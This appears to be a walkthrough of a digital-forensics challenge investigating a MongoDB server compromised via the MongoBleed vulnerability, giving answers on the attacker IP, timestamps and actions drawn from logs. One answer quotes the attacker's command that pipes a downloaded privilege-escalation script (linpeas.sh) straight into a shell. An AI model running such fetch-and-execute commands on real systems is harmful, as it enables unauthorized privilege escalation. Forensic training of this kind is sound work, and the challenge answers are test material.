
#### Sherlock Scenario

You were contacted early this morning to handle a high‑priority incident involving a suspected compromised server. The host, mongodbsync, is a secondary MongoDB server. According to the administrator, it's maintained once a month, and they recently became aware of a vulnerability referred to as MongoBleed. As a precaution, the administrator has provided you with root-level access to facilitate your investigation.

You have already collected a triage acquisition from the server using UAC. Perform a rapid triage analysis of the collected artifacts to determine whether the system has been compromised, identify any attacker activity (initial access, persistence, privilege escalation, lateral movement, or data access/exfiltration), and summarize your findings with an initial incident assessment and recommended next steps.

---
## Questions

### Q1: What is the CVE ID designated to the MongoDB vulnerability explained in the scenario?

#### A: CVE-2025-14847

Seeing as we already have the name of the vulnerability we just need to search it.

(https://socprime.com/es/active-threats/mongobleed-cve-2025-14847/)

![](../../Img/Pasted%20image%2020260305215918.png)

---

### Q2: What is the version of MongoDB installed on the server that the CVE exploited?

#### A: 8.0.16

Giving a quick look at the files and folder supplied, we can see that we are looking for it's in the root folder (given that the other folders don't contain anything related to a MongoDB version).

We do a simple search for "mongo" and we get this. 

![](../../Img/Pasted%20image%2020260305220552.png)

Inside the first folder we find a file named "mongod.log", open it and get to find the answer.

Doing a search for "version" (or as i later found out a search for "buildinfo" ) will get us the answer.

![](../../Img/Pasted%20image%2020260305220936.png)

---

### Q3: Analyze the MongoDB logs to identify the attacker’s remote IP address used to exploit the CVE.

#### A: 65.0.76.43

Given the nature of the attack, i just searched the log file until i found a lot of connections made to the DB.

![](../../Img/Pasted%20image%2020260305221419.png)

---

### Q4: Based on the MongoDB logs, determine the exact date and time the attacker’s exploitation activity began (the earliest confirmed malicious event)

#### A: 2025-12-29 05:25:52

look for the "date" attribute of the first entry for connection inside the MongoDB log.

![](../../Img/Pasted%20image%2020260305221636.png)

---

### Q5: Using the MongoDB logs, calculate the total number of malicious connections initiated by the attacker.

#### A: 75260

To get this one i just subtracted the line number where the connections end minus the line number where it starts.

---

### Q6: The attacker gained remote access after a series of brute‑force attempts. The attack likely exposed sensitive information, which enabled them to gain remote access. Based on the logs, when did the attacker successfully gain interactive hands-on remote access?

#### A: 2025-12-29 05:40:03

Since this is once the attacker gained access, we need to check the "auth" file to see the time when the attacker got a successful login.

![](../../Img/Pasted%20image%2020260305222527.png)

---

### Q7: Identify the exact command line the attacker used to execute an in‑memory script as part of their privilege‑escalation attempt.

#### A: curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

Now we need to do a search for "bash" and open the "bash_history" file and check.

![](../../Img/Pasted%20image%2020260305222750.png)

---

### Q8: The attacker was interested in a specific directory and also opened a Python web server, likely for exfiltration purposes. Which directory was the target?

#### A: /var/lib/mongodb

Looking at the history we can clearly see that the attacker was after the mongodb directory.


Tags: [Brute Force Attacks](../../Index/Brute%20Force%20Attacks.md) [Log Analysis](../../Index/Log%20Analysis.md) [MongoDB](../../Index/MongoDB.md) 
